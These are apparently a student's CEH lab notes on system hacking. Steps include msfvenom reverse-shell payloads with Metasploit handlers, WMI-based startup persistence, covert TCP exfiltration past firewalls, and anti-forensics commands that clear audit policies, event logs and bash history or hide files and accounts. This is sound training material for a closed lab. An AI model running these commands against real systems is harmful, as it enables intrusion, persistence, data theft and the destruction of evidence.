	Othe user -> CEH\Martin\apple
	powershell window
	dir \\10.10.1.22\C$
Note: If a **Server Manager** window appears close it.
Domain Controller is now accessible to **Martin** and thus domain persistence has been established.
Apart from the aforementioned PowerView commands, you can also use the additional commands in the table below to extract sensitive information such as users, groups, domains, and other resources from the target AD environment:
![[Pasted image 20231125165906.png]]
Restart Windows and parrot

---------
- Task 8: Privilege escalation and maintain persistence using WMI
  WMI (Windows Management Instrumentation) event subscription can be used to install event filters, providers, and bindings that execute code when a defined event occurs. It enables system administrators to perform tasks locally and remotely.

Note: In this task we will create two payloads, one to gain access to the system and another for WMI event subscription.

	[parrot]
	sudo su
	cd -> root dir
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Payload.exe
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/wmi.exe
share both the payloads follow same steps mentioned earlier

	cp /home/attacker/Desktop/Payload.exe /var/www/html/share/
	cp /home/attacker/Desktop/wmi.exe /var/www/html/share/
	service apache2 start
	
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.1.13
	set lport 444
	run
	
	[windows 2019]
	Administrator/Pa$$w0rd
	http://10.10.1.13/share
	download Payload.exe & wmi.exe
	Run payload.exe

	[parrot]
	meterpreter session has opened
	getuid
	upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
	load powershell
	powershell_shell
	PS>Import-Module ./WMI-Persistence.ps1
	Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”
Note: It will take approximately 5 minutes for the script to run.

	Open new terminal with root privileges
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.1.13
	set lport 444
	exploit
	
	Navigate to the previous terminal window and press ctr+c and type y and press Enter, to exit powershell.

	[Windows 2019]
	Restart
	
	[parrot]
	Navigate to the second terminal and we can see that the meterpreter session is opened. (take approximately 5-10 minutes for the session to open)
	getuid
We can see that we system privileges and persistence on the target machine, when ever the machine is restarted a session is created.

---------
- **Task 9: Covert channels using Covert_TCP**

Networks use network access control permissions to permit or deny the traffic flowing through them. Tunneling is used to bypass the access control rules of firewalls, IDS, IPS, and web proxies to allow certain traffic. Covert channels can be created by inserting data into the unused fields of protocol headers. There are many unused or misused fields in TCP or IP over which data can be sent to bypass firewalls.

The Covert_TCP program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze.

	[parrot] - target
	cd Desktop
	mkdir Send
	cd Send
	echo "Secret Message" > message.txt

	  Click Places -> Desktop -> ceh-tool 10.10.1.11
	  OR
	  Ctrl+L. smb://10.10.1.11
	   Windows credentials & Connect.
	
	copy covert_tcp.c to Desktop\send folder
	cc -o covert_tcp covert_tcp.c 
	
	[ubuntu] - host
	sudo su
	tcpdump -nvvx port 8888 -i lo -> [ifconfig to check interface]
	
	Open new Terminal
	cd Desktop
	mkdir Receive
	cd Receive
	
	L-H pane-> Files -> Other locations
	smb://10.10.1.11 -> connect to server -> connect
	Enter credentials Admin/Pa$$w0rd -> connect
	CEH-Tools
	copy covert_tcp.c to Desktop/receive folder
	
	/Desktop/Receive>cc -o covert_tcp covert_tcp.c
	sudo su
	./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt  [start listening]
	
	[parrot]
	open wireshark -> pwd -> toor
	open primary n/w interface eth0
	
	Terminal>sudo su
	./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt [start sending the contents of 
	message.txt over tcp]
	NOTE: Only source_port and dest_port changes. convert_tcp starts sending the string one char at a time
	
	[ubuntu]
	Observe the message being received [close the terminal]

	Open first terminal
	Observe that tcpdump shows that no packets were captured in the network, as shown in the screenshot; then, close the **Terminal** window.
	navigate to /home/ubuntu/Desktop/Receive and double-click the receive.txt file to view its contents.
	
	[parrot]
	close terminal
	open wireshark -> stop capturing pks icon
	Apply filter -> tcp [to view tcp packets]
If you examine the communication between the machines, you will find each character of the message string being sent in individual packets over the network.
Covert_tcp changes the header of the tcp packets and replaces it, one character at a time, with the characters of the string in order to send the message without being detected

---------

**Lab4. Clear logs to hide the evidence of compromise

A professional ethical hacker and penetration tester’s last step in system hacking is to remove any resultant tracks or traces of intrusion on the target system. One of the primary techniques to achieve this goal is to manipulate, disable,or erase the system logs. Once you have access to the target system, you can use inbuilt system utilities to disable or tamper with the logging and auditing mechanisms in the target system.

- **Disable Auditing**: Disable the auditing features of the target system
- **Clearing Logs**: Clears and deletes the system log entries corresponding to security compromise activities
- **Manipulating Logs**: Manipulate logs in such a way that an intruder will not be caught in illegal actions
- **Covering Tracks on the Network**: Use techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and TCP parameters to cover tracks on the network.
- **Covering Tracks on the OS**: Use NTFS streams to hide and cover malicious files in the target system
- **Deleting Files**: Use command-line tools such as Cipher.exe to delete the data and prevent its future recovery
- **Disabling Windows Functionality**: Disable Windows functionality such as last access timestamp, Hibernation, virtual memory, and system restore points to cover tracks


**Task 1: View, enable, and clear audit policies using Auditpol**

	[Windows 11]	
	cmd -> Run as Admin
	auditpol /get /category:*         [to view all the audit policies]
	auditpol /set /category:"system","account logon" /success:enable /failure:enable       [to enable audit policies]
	auditpol /get /category:*         [to check whether audit policies are enabled]
	auditpol /clear /y                [to clear audit policies]
	auditpol /get /category:*         [to check whether audit policies are cleared]

Note: **No Auditing** indicates that the system is not logging audit policies.

Note: For demonstration purposes, we are clearing logs on the same machine. In real-time, the attacker performs this process after gaining access to the target system to clear traces of their malicious activities from the target system.

--------
- **Task 2: Clear Windows machine logs using various utilities**

	[windows 11]
	navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat. Right-click Clear_Event_Viewer_Logs.bat and click Run as administrator.
	User Account Control pop-up appears; click Yes.

Note: Clear_Event_Viewer_Logs.bat is a utility that can be used to wipe out the logs of the target system. This utility can be run through command prompt or PowerShell, and it uses a BAT file to delete security, system, and application logs on the target system. You can use this utility to wipe out logs as one method of covering your tracks on the target system.

	cmd -> Run as admin
	wevtutil el  [list of event logs]
	[Note: el | enum-logs lists event log names.]
	wevtutil cl system  (wevtutil cl [log_name])
Similarly, you can also clear application and security logs by issuing the same command with different log names (**application, security**).
Note: wevtutil is a command-line utility used to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, run queries, and export, archive, and clear logs.

	cipher /w:[Drive or Folder or File Location]          (to overwrite deleted files in a specific drive, folder, or file.)
Note: Here, we are encrypting the deleted files on the **C:** drive. You can run this utility on the drive, folder, or file of your choice.

The Cipher.exe utility starts overwriting the deleted files, first, with all zeroes (0x00); second, with all 255s (0xFF); and finally, with random numbers, as shown in the screenshot.
Note: Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. This command also assists in encrypting and decrypting data in NTFS partitions.

	cipher /w:C:
	ctr + c   -> stop the encryption
Note: When an attacker creates a malicious text file and encrypts it, at the time of the encryption process, a backup file is created. Therefore, in cases where the encryption process is interrupted, the backup file can be used to recover the data. After the completion of the encryption process, the backup file is deleted, but this deleted file can be recovered using data recovery software and can further be used by security personnel for investigation. To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.

---------

**Task 3: Clear Linux machine logs using the BASH shell**

as investigators could use the bash_history file to track the origin of an attack and learn the exact commands used by the intruder to compromise the system.
more ~/.bash_history command

	[parrot]
	export HISTSIZE=0   -> Disable BASH shell from saving history, HISTSIZE -> determines the number of commands to be saved, which will be set to 0.
	history -c          -> to clear saved history
	history -w          -> [To delete the history of current shell]
	shred ~/.bash_history -> shread the history file, making its content unreadable
	more ~/.bash_history
	ctrl +z
	
	Combine all cmds together
	shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit   
This command first shreds the history file, then deletes it, and finally clears the evidence of using this command.)

----------
- **Task 4: Hiding artifacts in windows and Linux machines**

  	[Windows 11]
  	cmd -> run as admin
  	cd c:\users\admin\desktop
  	mkdir Test
  	dir   -> Test dir is hidden
  	attrib +h +s +r Test -> to hide
  	dir   
  	net user Test /add -> To add Test as user in the machine
  	net user Test /active:yes -> To activate Test account type
  	Click on windows icon and click on user **Admin** to see the users list, you can see that the user **Test** is added to the list.
  	net user Test /active:no -> Test account is removed from the list
  	
  	[parrot] -> hide files 
  	cd Desktop
  	mkdir Test
  	cd Test
  	>>Sample.txt   -> to create Sample.txt
  	ls
  	touch Sample.txt
  	ls
  	touch .Secret.txt
  	ls
  	ls -al
Note: In a real scenario, attackers may attempt to conceal artifacts corresponding to their malicious behavior to bypass security controls. Attackers leverage this OS feature to conceal artifacts such as directories, user accounts, files, folders, or other system-related artifacts within the existing artifacts to circumvent detection.
	
----

**Task 5: Clear Windows machine logs using CCleaner***

	[Windows 11]
	E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\CCleaner; double-click ccsetup591_pro_trial.exe
	install
	Deselect view release notes, Run CCleaner
	Start my trial
	CCleaner Professional window -> Click Health check
	Make it better
	Your PC now feels like a superstar message appears

Also use the **Custom Clean** option, where you can analyze system files by selecting or deselecting different file options in the **Windows** and **Applications** tabs,
Similarly, you can use the **Registry** option to scan for issues in the registry. Under the **Tools** option, you can do things like uninstall applications, get software update information, and get browser plugin information.